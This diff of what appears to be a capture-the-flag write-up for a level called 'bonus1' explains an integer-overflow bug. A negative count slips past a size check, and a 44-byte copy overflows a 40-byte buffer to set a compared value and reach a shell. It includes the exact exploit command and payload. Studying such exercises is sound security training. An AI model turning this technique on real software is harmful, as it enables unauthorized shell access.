@@ -13,13 +13,17 @@
 
 UINT_MAX = 4294967295
 Theorique UINT_MIN = -4294967295 - 1
-44 is the number of bytes we want to cpy (buffer[40] + adress)
+44 is the number of bytes we want to cpy (buffer[40] + compared value)
 We divide by 4 bc malloc(sizeof(int) * av[0])
 (-4294967296 + 44) / 4 = 1073741813
 
 
 undefined buff [40];  # stocker a la suite coller coller
 int m;
+....
+if (m == 0x574f4c46) {
+ execl("/bin/sh","sh",0);
+}
 
 ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
 $ whoami
